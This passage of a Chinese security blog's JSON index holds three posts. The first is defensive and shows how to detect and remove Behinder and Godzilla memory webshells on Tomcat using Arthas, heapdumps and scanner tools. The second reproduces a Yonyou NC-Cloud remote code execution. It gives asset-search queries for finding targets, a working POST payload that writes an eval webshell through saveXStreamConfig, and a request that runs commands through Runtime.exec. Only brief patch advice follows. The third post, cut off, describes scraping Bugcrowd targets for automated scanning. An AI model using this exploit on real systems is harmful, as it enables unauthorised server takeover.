alt=\"image\"></p>\n<p>需要实名验证，所以就不用这个做了，很麻烦。</p>\n","categories":["Hexo"],"tags":["Hexo","环境搭建"]},{"title":"浅谈冰蝎、哥斯拉内存马排查思路","url":"/2023/08/20/%E6%B5%85%E8%B0%88%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/","content":"<h1 id=\"浅谈冰蝎、哥斯拉内存马排查思路\"><a href=\"#浅谈冰蝎、哥斯拉内存马排查思路\" class=\"headerlink\" title=\"浅谈冰蝎、哥斯拉内存马排查思路\"></a>浅谈冰蝎、哥斯拉内存马排查思路</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近有师傅问到遇到被内存马注入了，应该怎么排查，特别是常见是冰蝎和哥斯拉的内存马。刚好有空这两天在本地分析了一下内存马的排查思路，以及怎么查杀清除内存马</p>\n<h2 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p>Centos ：release 7.6.1810 (Core)</p>\n<p>Tomcat：v8.0.35  <a href=\"https://archive.apache.org/dist/tomcat/tomcat-8/v8.0.35/bin/apache-tomcat-8.0.35.tar.gz\">https://archive.apache.org/dist/tomcat/tomcat-8/v8.0.35/bin/apache-tomcat-8.0.35.tar.gz</a></p>\n<p>Behinder：v4.0.6 <a href=\"https://github.com/rebeyond/Behinder\">https://github.com/rebeyond/Behinder</a></p>\n<p>godzilla_v4.0.1 <a href=\"https://github.com/BeichenDream/Godzilla\">https://github.com/BeichenDream/Godzilla</a></p>\n<p>arthas 3.7.0 <a href=\"https://github.com/alibaba/arthas\">https://github.com/alibaba/arthas</a>   （Alibaba Java诊断利器Arthas）</p>\n<p>shell-analyzer 0.1 <a href=\"https://github.com/4ra1n/shell-analyzer\">https://github.com/4ra1n/shell-analyzer</a> （基于 Java Agent 的内存马查杀 GUI 工具）</p>\n<p>在centos7上部署Tomcat</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//archive.apache.org/dist/tomcat/tomcat-8/v8.0.35/bin/apache-tomcat-8.0.35.tar.gz</span></span><br></pre></td></tr></table></figure>\n<p>解压</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">tar -zxvf apache-tomcat-<span class=\"number\">8.0</span><span class=\"number\">.35</span>.tar.gz</span><br></pre></td></tr></table></figure>\n<h2 id=\"Behinder的webshell\"><a href=\"#Behinder的webshell\" class=\"headerlink\" title=\"Behinder的webshell\"></a>Behinder的webshell</h2><p>我们生成服务端之后直接上传到tomcat的apache-tomcat-8.0.35&#x2F;webapps&#x2F;ROOT&#x2F;ncshell目录中。(我自己创建了个目录ncshell)</p>\n<p><img src=\"1t8RoTug5P19_6Y-ITshopEeVZ_RLjqL5zEsWZYulmA.png\" alt=\"image\"></p>\n<p>使用客户端连接：<a href=\"http://192.168.88.104:8080/ncshell/bxdefault_aes.jsp\">http://192.168.88.104:8080/ncshell/bxdefault_aes.jsp</a></p>\n<p><img src=\"9edAc2MtuS2Chf3lJ8wO8p_eTQCiI17lnpo9xmXfz8A.png\" alt=\"image\"></p>\n<h2 id=\"arthas的使用\"><a href=\"#arthas的使用\" class=\"headerlink\" title=\"arthas的使用\"></a>arthas的使用</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">下载：wget https:<span class=\"comment\">//github.com/alibaba/arthas/releases/download/arthas-all-3.7.0/arthas-bin.zip；unzip </span></span><br><span class=\"line\">解压：arthas-bin.zip</span><br><span class=\"line\">启动：java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>\n<p>发现报错了。CentOS 自带openjdk不支持jps、jstack等命令。</p>\n<p><img src=\"4DJ16KUrBrVuKAw-QSbYylMqcSdhNfExt--D72RD4rU.png\" alt=\"image\"></p>\n<p>就算指定pid运行也会报错没有找到tools.jar；</p>\n<p><img src=\"N8HkOxRMnAw5by8BYc6qAL8ev-FPTCVVyEatorHiAJI.png\" alt=\"image\"></p>\n<p>我直接通过yum升级安装一下解决</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install java-<span class=\"number\">1.8</span><span class=\"number\">.0</span>-openjdk-devel.x86_64</span><br></pre></td></tr></table></figure>\n<p><img src=\"I8cXYma1eb7D44xn80H3995Bop_lCq0Xd47YCL4RaBw.png\" alt=\"image\"></p>\n<p>再次启动arthas-boot.jar；成功</p>\n<p><img src=\"rRY9BorCS-PtyVCydR4JeajT7izMkT5PZXLks8qYWOA.png\" alt=\"image\"></p>\n<p>查看一下内存中mbean信息</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mbean | grep <span class=\"string\">&quot;name=/&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"5AuRcjdNiRFbFF_nRTXKMJXhG0aMaIAUq6OknrvqyM0.png\" alt=\"image\"></p>\n<p>Arthas 常用命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">dashboard：显示当前应用程序的实时运行状况，包括 CPU 使用率、内存使用情况、线程情况等</span><br><span class=\"line\">jvm：查看和管理 JVM 的相关信息，包括堆内存、GC 状态、类加载情况等</span><br><span class=\"line\">sc：查看和搜索类信息，包括加载的类、类的字段和方法等。</span><br><span class=\"line\">sm：查看和搜索方法信息，可以查看方法的字节码、参数、返回值等</span><br><span class=\"line\">jad：反编译指定类的字节码，查看类的实现代码。</span><br><span class=\"line\">classloader：显示当前应用程序中所有的类加载器及其层次结构。可以查看每个类加载器的名称、父加载器和已加载的类数量</span><br><span class=\"line\">heapdump 生成 Java 应用程序的堆转储（Heap Dump）文件</span><br></pre></td></tr></table></figure>\n<h2 id=\"Behinder内存马排查思路\"><a href=\"#Behinder内存马排查思路\" class=\"headerlink\" title=\"Behinder内存马排查思路\"></a>Behinder内存马排查思路</h2><p>注入之前，先查看一下加载器的信息和servlet的信息（因为冰蝎注入的是servlet类型的内存马）</p>\n<p><img src=\"Lpw2x-F7HL_maIFgojMM-t9GmB-fANd8yZ4qUjKzS6o.png\" alt=\"image\"></p>\n<p>此时已经发现了一个可疑的类，这个是实体的webshell，也就是我们上传到tomcat目录的那个：org.apache.jsp.ncshell.bxdefault_005faes_jsp</p>\n<p>使用jad查看一下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">jad org.apache.jsp.ncshell.bxdefault_005faes_jsp</span><br><span class=\"line\">jad javax.servlet.http.HttpServlet</span><br></pre></td></tr></table></figure>\n<p>得知org.apache.jsp.ncshell.bxdefault_005faes_jsp很明显的是webshell</p>\n<p><img src=\"nDlVRbRYSXbogYGNQJznkEibkJNK7znK-uRwu65Thbw.png\" alt=\"image\"></p>\n<p>为什么也要看一下javax.servlet.http.HttpServlet这个类呢，因为冰蝎的内存马是注入到这个类里面的；此时查看发现暂未发现异常。</p>\n<p><img src=\"qN28QJ4P9NKNEgn8ui8mbSjQjDKwwxjh_VkhxRhr74I.png\" alt=\"image\"></p>\n<p>注入内存马；把防检测也勾选上。</p>\n<p><img src=\"D9QjOoWYdJXFHDknhyIJ6NL-EVcvQkqy4shWyGz5tjo.png\" alt=\"image\"></p>\n<p>注入成功，且成功连接内存马</p>\n<p><img src=\"6h4wFb8DmFrynE_GFF5q-H0tu139R-FvuQt5hK7xeO4.png\" alt=\"image\"></p>\n<p>我们再来看一下加载器的信息和servlet的信息；发现多了一个可疑的加载器。</p>\n<p><img src=\"rbZc6lOu3dhk5XAuHm3oD2q57u3Z_DKylUYq02Mta5c.png\" alt=\"image\"></p>\n<p>jad查看后发现是使用 super.defineClass 方法将字节数组转换为一个 Class 对象进行定义和加载</p>\n<p><img src=\"N1J2-L-upruHNFnOoS9oW_tL-786XRR5kyu-WwzQUXQ.png\" alt=\"image\"></p>\n<p>我们再去查看一下javax.servlet.http.HttpServlet；此时我们发现在它的service方法中，已经被注入了 内存马。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">jad javax.servlet.http.HttpServlet</span><br></pre></td></tr></table></figure>\n<p><img src=\"s-hj8Cn1Gw0Y6TJl76Ox3Ndb7duyH4AwNSbHsRkgwE4.png\" alt=\"image\"></p>\n<p>那么很确定了这个就是内存马，下面我们来那它关闭或者破坏掉，使其失效。</p>\n<h2 id=\"Behinder内存马清除\"><a href=\"#Behinder内存马清除\" class=\"headerlink\" title=\"Behinder内存马清除\"></a>Behinder内存马清除</h2><p>找了一圈发现，arthas并没有直接关闭指定类的功能。但是可以使用arthas进行热更新代码；但是我使用它做编译的时候失败了，后来学习了一下Javaagent技术，可以对jvm内的运行时类操作，于是可以编写一个agent使用retransformClass字节码重定义技术重新定义这个类。</p>\n<p>项目的代码我已上传到github：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//github.com/Garck3h/killBehinderMemShell</span></span><br></pre></td></tr></table></figure>\n\n\n<p>直接使用工具重置javax.servlet.http.HttpServlet类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -Xbootclasspath/a:/usr/lib/jvm/java-<span class=\"number\">1.8</span><span class=\"number\">.0</span>-openjdk-<span class=\"number\">1.8</span><span class=\"number\">.0</span><span class=\"number\">.372</span>.b07-<span class=\"number\">1.</span>el7_9.x86_64/lib/tools.jar -jar killBehinderMemShell-<span class=\"number\">1.0</span>-jar-with-dependencies.jar <span class=\"number\">61259</span> javax.servlet.http.HttpServlet</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://github.com/Garck3h/killBehinderMemShell/raw/%E4%B8%BB%E8%A6%81/images/LRZIYEFK1csDb3S8p5QnGWXOfrmtGnCTUiWJ3GXQhV4.png\" alt=\"image\"></p>\n<h2 id=\"heapdump的使用\"><a href=\"#heapdump的使用\" class=\"headerlink\" title=\"heapdump的使用\"></a>heapdump的使用</h2><p>首先导出当前内存快照</p>\n<p><img src=\"cvrI7-toXCGmmQRWzHXeqCdVozjjlXEYJw03CRts4x8.png\" alt=\"image\"></p>\n<p>然后使用string查看post请求的记录；发现可疑的请求目录</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">strings /root/neicunma/apache-tomcat-<span class=\"number\">8.0</span><span class=\"number\">.35</span>/temp/heapdump2023-08-<span class=\"number\">16</span>-<span class=\"number\">23</span>-<span class=\"number\">286100384348377803151.</span>hprof | grep <span class=\"string\">&quot;POST /&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"70cyghx2BYvxOYu7fNjPWhAsGFTPR1OBzlTdXgerX9Q.png\" alt=\"image\"></p>\n<p>查看可疑路径；无果</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">strings /root/neicunma/apache-tomcat-<span class=\"number\">8.0</span><span class=\"number\">.35</span>/temp/heapdump2023-08-<span class=\"number\">16</span>-<span class=\"number\">23</span>-<span class=\"number\">286100384348377803151.</span>hprof | grep -E <span class=\"string\">&quot;/webapps/.*?\\!&quot;</span> | sort -u</span><br></pre></td></tr></table></figure>\n<p><img src=\"ORoYA6beadCJgvTxXpaQo54B8LxMQVqZm7C_NF7pT3c.png\" alt=\"image\"></p>\n<p>至此冰蝎内存马的排查已完毕。</p>\n<h2 id=\"godzilla内存马\"><a href=\"#godzilla内存马\" class=\"headerlink\" title=\"godzilla内存马\"></a>godzilla内存马</h2><p>生成哥斯拉webshell上传至tomcat，进行连接。</p>\n<p><img src=\"cHlYsKv_v9dUsN1R0N9jLs4_6Hjzf19pof37vawK5XQ.png\" alt=\"image\"></p>\n<p>哥斯拉工具中有FilterShell和memoryShell两种内存马</p>\n<h2 id=\"FilterShell\"><a href=\"#FilterShell\" class=\"headerlink\" title=\"FilterShell\"></a>FilterShell</h2><p>注入Filter类型的内存马</p>\n<p><img src=\"2U3cx4anMPXDDvlSNg-V1L6GfnE2eP9RHSQsbdnpeTw.png\" alt=\"image\"></p>\n<p>看一下当前的过滤器；有两个过滤器监听着所有的访问路径</p>\n<p><img src=\"KXB9NqlXDzUTxvpTf2dVwvrHCQLNDL9Ohn3Umh9uSU0.png\" alt=\"image\"></p>\n<p>使用arthas分析；查看所有的Filter；看到了一个可疑的Filter：org.apache.coyote.jsonFormatVisitors.JsonFormatTypes</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc *.Filter</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"rNl7tUovM_x2yrAVexLxAhGJU08jyhr1iYFpxLXa8dQ.png\" alt=\"image\"></p>\n<p>使用jad查看源码，分析得知</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">jad org.apache.coyote.jsonFormatVisitors.JsonFormatTypes</span><br></pre></td></tr></table></figure>\n<p>继承了加载器和过滤器的接口；同时定义了一些敏感的属性</p>\n<p><img src=\"THvHT5pCpGOB5YopzYtDWtLna2MDxzdpqoaitDOnW98.png\" alt=\"image\"></p>\n<p>可以看到，这里监听了全部的uri路径”&#x2F;*“。代码的大致功能为添加一个过滤器，并将过滤器配置和过滤器映射添加到标准上下文中，然后对过滤器进行排序，确保把它放在最高的优先级。</p>\n<p><img src=\"aVyvgYt3m949W7fb0IYwWoV3CfyrcrB7jkUYVrjWXmU.png\" alt=\"image\"></p>\n<p>剩下的就是一个处理请求的和一些编码的函数了。</p>\n<h2 id=\"MemoryShell\"><a href=\"#MemoryShell\" class=\"headerlink\" title=\"MemoryShell\"></a>MemoryShell</h2><p>我们重点来分析一下MemoryShell；该功能不仅可以注入哥斯拉的shell，还可以注入冰蝎、菜刀甚至ReGeorg。我们注入一个哥斯拉的内存马。</p>\n<p><img src=\"LDcP45oKZM-fYZNQZnQV2o2kivkieJtzR5Pp_KDoacs.png\" alt=\"image\"></p>\n<p>连接成功</p>\n<p><img src=\"OzHZt-Ret-0WaSaDJW4_Bgf4OMh1vwjBxLqjc7jabqM.png\" alt=\"image\"></p>\n<p>查看jvm中的servlet的情况；多了一个可疑的类：org.apache.coyote.ser.impl.TypeWrappedSerializer</p>\n<p><img src=\"L19wcE7Z86-AZeYq54PAGM30MIxltdv1k5TQRgNfgRU.png\" alt=\"image\"></p>\n<p>jad分析可疑的Servlet类：org.apache.coyote.ser.impl.TypeWrappedSerializer；该类实现了一个包装器，大致是用于在Servlet上下文中添加Servlet。其中transform 方法用于对传入的 standardContext 对象进行一系列的处理；x 方法是一个AES的加解密方法；还有md5方法；最后还使用了noLog 方法禁止日志记录。</p>\n<p><img src=\"y7ltZk5QwDTwdjlipgu9gBWu2gKeRnCz0CQeW0G9JU4.png\" alt=\"image\"></p>\n<p>同时查看内存中的请求url；也可以发现可疑的情况</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mbean | grep <span class=\"string\">&quot;name=/&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"DJxGQkZ2vOfP82IhZtG1GuddZ3ay_GGMIXLdOP4DaX4.png\" alt=\"image\"></p>\n<h2 id=\"哥斯拉内存马查杀一\"><a href=\"#哥斯拉内存马查杀一\" class=\"headerlink\" title=\"哥斯拉内存马查杀一\"></a>哥斯拉内存马查杀一</h2><p>github地址：<a href=\"https://github.com/c0ny1/java-memshell-scanner\">https://github.com/c0ny1/java-memshell-scanner</a></p>\n<p>直接把jsp上传到tomcat下，访问解析会自动查找疑似的内存马，可dump class文件下来分析，也可直接kill掉该类。</p>\n<p>这时候发现了servlet类型的内存马。直接kill掉。</p>\n<p><img src=\"EAsS4wQ2Mo8JdAnAMzy5zvfz5i8nBMCZCEIkTuMNfbg.png\" alt=\"image\"></p>\n<p>kill掉之后，业务还可正常访问，但内存马已经失效。</p>\n<p><img src=\"pNi1rnrx6Kwb12sAMxPZTtKh-jTlPOf2LG0rv-DOrJQ.png\" alt=\"image\"></p>\n<h2 id=\"哥斯拉内存马查杀二\"><a href=\"#哥斯拉内存马查杀二\" class=\"headerlink\" title=\"哥斯拉内存马查杀二\"></a>哥斯拉内存马查杀二</h2><p>github：<a href=\"https://github.com/4ra1n/shell-analyzer\">https://github.com/4ra1n/shell-analyzer</a></p>\n<p>使用jps查看进程</p>\n<p><img src=\"IY5bzj3cSgT7dbDpZY1GKmyr_nJUo5nd8MPq2rhRAxU.png\" alt=\"image\"></p>\n<p>启动服务端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp remote-<span class=\"number\">0.1</span>.jar:/usr/lib/jvm/java-<span class=\"number\">1.8</span><span class=\"number\">.0</span>-openjdk-<span class=\"number\">1.8</span><span class=\"number\">.0</span><span class=\"number\">.372</span>.b07-<span class=\"number\">1.</span>el7_9.x86_64/lib/tools.jar com.n1ar4.RemoteLoader <span class=\"number\">76589</span> adminasd</span><br><span class=\"line\"></span><br><span class=\"line\">参数解析</span><br><span class=\"line\"><span class=\"number\">76589</span>为进程pid</span><br><span class=\"line\">adminasd 为设置的密码</span><br></pre></td></tr></table></figure>\n<p><img src=\"gUSCS0vhtzEzpS-Ffk0byJt73LAIiGMi_V-vwVkZLxs.png\" alt=\"image\"></p>\n<p>启动gui客户端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar gui-<span class=\"number\">0.1</span>.jar</span><br></pre></td></tr></table></figure>\n<p>输入token（上面设置的密码）和IP之后点击attach即可。双击显示的类可以反编译代码</p>\n<p><img src=\"GUUFHm9A92N2HwiktR-vbpW6qUUHtLqBV7TdodQh1b8.png\" alt=\"image\"></p>\n<p>直接删除内存马</p>\n<p><img src=\"gyHj3P7WLkbHyckjnR7-eJSjUdsGiesBa9AevRedKAg.png\" alt=\"image\"></p>\n<h2 id=\"jdk自带的sa-jdi\"><a href=\"#jdk自带的sa-jdi\" class=\"headerlink\" title=\"jdk自带的sa-jdi\"></a>jdk自带的sa-jdi</h2><p>sa-jdi是JDK提供的一个强大的调试工具集，适用于语言层和虚拟机层，支持调试运行着的Java进程、core文件和虚拟机crash之后的dump文件。在没有其它工具的情况下，也可以勉强凑合着使用它进行简单的分析。</p>\n<p>运行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp /usr/lib/jvm/java-<span class=\"number\">1.8</span><span class=\"number\">.0</span>-openjdk-<span class=\"number\">1.8</span><span class=\"number\">.0</span><span class=\"number\">.372</span>.b07-<span class=\"number\">1.</span>el7_9.x86_64/lib/sa-jdi.jar sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure>\n<p>输入jps查看到Bootstrap的pid</p>\n<p><img src=\"zjN4TCEl5VYNyhKUWLhHJg8f3WGtAXphmNSVGXCkG7M.png\" alt=\"image\"></p>\n<p>可以直接查看正在jvm中运行的类，以及反编译查看源码内容</p>\n<p><img src=\"ULHv1f97j1RPJBJKWQtqQ45Do5LHhkbhm_VdACbCBZE.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>本文主要简单分析了冰蝎和哥斯拉常见的内存马，其中冰蝎的内存马是agent类型的，使用常规的杀软工具未必可以扫描杀除，我写了个小工具根据分析得知的恶意类之后，进行重置。对于普通的Filter和servlet类型的内存马可以使用上述的jsp查杀工具或者gui工具进行查杀。当然感兴趣的师傅也可以使用arthas热更新代码功能尝试去破坏掉恶意类。后续若有空，我也继续完善一下内存马清除工具。</p>\n<h2 id=\"arthas热更新破坏godzilla内存马（失败）\"><a href=\"#arthas热更新破坏godzilla内存马（失败）\" class=\"headerlink\" title=\"arthas热更新破坏godzilla内存马（失败）\"></a>arthas热更新破坏godzilla内存马（失败）</h2><p>jad反编译的结果保存在 &#x2F;tmp&#x2F;bxdefault_005faes_jsp.java文件里</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">jad --source-only org.apache.coyote.ser.impl.TypeWrappedSerializer &gt; /tmp/TypeWrappedSerializer.java</span><br></pre></td></tr></table></figure>\n<p>在新窗口使用vim修改内存马的密码（在Decrypt方法内），或者进行其它操作都可以；然后保存。</p>\n<p><img src=\"ybALRGhjlBT06XwF13cTVMDsS9HyntcBxp9jIc-H0ZQ.png\" alt=\"image\"></p>\n<p>回到arthas。使用sc查找加载.bxdefault_005faes_jsp的ClassLoader</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc -d org.apache.coyote.ser.impl.TypeWrappedSerializer | grep classLoaderHash</span><br><span class=\"line\">classLoaderHash   42f71ecb</span><br></pre></td></tr></table></figure>\n<p><img src=\"BLCFdo--IhGnzIB5ZkX_-seRAPnLK5vyfyYDH4lXt8o.png\" alt=\"image\"></p>\n<p>使用mc命令编译</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mc -c 42f71ecb /tmp/TypeWrappedSerializer.java -d /tmp</span><br></pre></td></tr></table></figure>\n<p><img src=\"DeAUEIkFYnDX9wz2ncWd9KHIaHWqyp0yx31W3Q9hF1o.png\" alt=\"image\"></p>\n<p>使用redefine命令重新加载新编译好的bxdefault_005faes_jsp.class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">redefine  /tmp/org/apache/jsp/ncshell/bxdefault_005faes_jsp.class /tmp/org/apache/jsp/ncshell/bxdefault_005faes_jsp$U.class</span><br></pre></td></tr></table></figure>\n<p><img src=\"L3g_AXGOXjQtt_ohN2ZUHHc0nBF6arw5RWYrGtrTlp0.png\" alt=\"image\"></p>\n","categories":["Java安全"],"tags":["内存马"]},{"title":"用友-NC-Cloud远程代码执行漏洞","url":"/2023/08/11/%E7%94%A8%E5%8F%8B-NC-Cloud%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","content":"<h1 id=\"用友-NC-Cloud远程代码执行漏洞\"><a href=\"#用友-NC-Cloud远程代码执行漏洞\" class=\"headerlink\" title=\"用友-NC-Cloud远程代码执行漏洞\"></a>用友-NC-Cloud远程代码执行漏洞</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>昨天开始疯传的NC-Cloud全版本通杀的RCE，捡到POC之后立马复现成功。用友NCCloud大型企业数字化平台，深度应用新一代数字智能技术， 完全基于云原生架构，打造开放、互联、融合、智能的一 体化云平台，聚焦数智化管理、数智化经营、数智化商业等三大企业 数智化转型战略方向，提供涵盖数字营销、财务共享、全 球司库、智能制造、敏捷供应链、人才管理、智慧协同等18大解决方 案，帮助大型企业全面落地数智化。</p>\n<h2 id=\"漏洞介绍\"><a href=\"#漏洞介绍\" class=\"headerlink\" title=\"漏洞介绍\"></a>漏洞介绍</h2><p>该漏洞是通过请求特定的接口，然后调用”nc.itf.iufo.IBaseSPService”服务中的”saveXStreamConfig”方法进行请求；直接往webapps&#x2F;nc_web&#x2F;目录写马。最后访问刚才写的马，调用 Runtime.getRuntime().exec(“command”) 来执行系统命令，并通过getInputStream()获取该命令的输出流；然后IOUtils.toString() 方法将输出流转换为字符串。</p>\n<h2 id=\"资产搜索\"><a href=\"#资产搜索\" class=\"headerlink\" title=\"资产搜索\"></a>资产搜索</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">FOFA：app=<span class=\"string\">&quot;用友-NC-Cloud&quot;</span></span><br><span class=\"line\">鹰图：web.title=<span class=\"string\">&quot;大型企业数字化平台&quot;</span></span><br><span class=\"line\">Hunter：web.body=<span class=\"string\">&quot;uap/rbac&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"r0e_jxVAL_dP5CE7tzYlGOmsZfSFbonS0KEJp_wKa7I.png\" alt=\"image\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>通过接口写马，把马写到web目录：webapps&#x2F;nc_web&#x2F;</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /uapjs/jsinvoke/?action=invoke HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: xxx.xxx.xxx.xxx:xxxx</span><br><span class=\"line\">Cache-Control: max-age=<span class=\"number\">0</span></span><br><span class=\"line\">Upgrade-Insecure-Requests: <span class=\"number\">1</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64) AppleWebKit/<span class=\"number\">537.36</span> (KHTML, like Gecko) </span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,image/apng,*<span class=\"comment\">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server</span></span><br><span class=\"line\"><span class=\"comment\">If-None-Match: W/&quot;1571-1589211696000&quot;</span></span><br><span class=\"line\"><span class=\"comment\">If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 248</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">&#123;&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;$&#123;param.getClass().forName(param.error).newInstance().eval(param.cmd)&#125;&quot;,&quot;webapps/nc_web/0811.jsp&quot;]&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"TGyRD0y9zB7qLJsL3S2uCdmw8VAyJudBF__HEYoVCeA.png\" alt=\"image\"></p>\n<p>访问马执行命令：ifconfig</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /<span class=\"number\">0811.</span>jsp?error=bsh.Interpreter HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: xxx.xxx.xxx.xxx:xxxx</span><br><span class=\"line\">Cache-Control: max-age=<span class=\"number\">0</span></span><br><span class=\"line\">Upgrade-Insecure-Requests: <span class=\"number\">1</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64) AppleWebKit/<span class=\"number\">537.36</span> (KHTML, like Gecko)</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,image/apng,*<span class=\"comment\">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server</span></span><br><span class=\"line\"><span class=\"comment\">If-None-Match: W/&quot;1571-1589211696000&quot;</span></span><br><span class=\"line\"><span class=\"comment\">If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 98</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(&quot;ifconfig&quot;).getInputStream())</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"qAWB6Ai9B6JIJh3zmT4-oMjZwQNlKa0JWzyYRv6hicg.png\" alt=\"image\"></p>\n<h2 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h2><p>1.更新至最新版本</p>\n<p>2.waf配置规则拦截敏感字符：eval(param、param.error等</p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE"]},{"title":"编写爬虫获取Bugcrowd的测试目标","url":"/2023/06/28/%E7%BC%96%E5%86%99%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96Bugcrowd%E7%9A%84%E6%B5%8B%E8%AF%95%E7%9B%AE%E6%A0%87/","content":"<h1 id=\"编写爬虫获取Bugcrowd的测试目标\"><a href=\"#编写爬虫获取Bugcrowd的测试目标\" class=\"headerlink\" title=\"编写爬虫获取Bugcrowd的测试目标\"></a>编写爬虫获取Bugcrowd的测试目标</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在最近遇到一个需求，就是需要把Bugcrowd上全部测试目标需要全部获取。于是便想到了使用自己老久以前学过的简单爬虫来实现。主要就是把全部能够获取赏金的项目的测试URL全部爬取后存储到本地，然后直接丢进扫描工具进行扫描，使得实现自动化挖洞。</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>首先查看有赏金的项目页面是这样的</p>\n<p>访问的URL：</p>\n<figure class=\"highlight python\"><table><tr><td 